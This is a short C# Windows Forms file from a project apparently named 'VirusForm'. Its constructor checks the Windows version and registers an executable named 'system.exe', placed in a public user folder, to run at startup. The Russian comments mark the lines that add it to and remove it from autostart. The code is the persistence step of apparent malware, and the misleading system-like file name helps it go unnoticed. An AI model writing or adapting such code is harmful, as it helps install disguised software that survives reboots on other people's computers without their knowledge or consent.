using JCS;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VirusForm
{
    public partial class Form1 : Form
    {
        public static string needPatch = "C:\\Users\\Public\\";
        public Form1()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista")
            {
                Autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
                {
                    needPatch = "C:\\Documents and Settings\\All Users\\";
                    Autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                    //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
                }
            InitializeComponent();

        }
    }
}
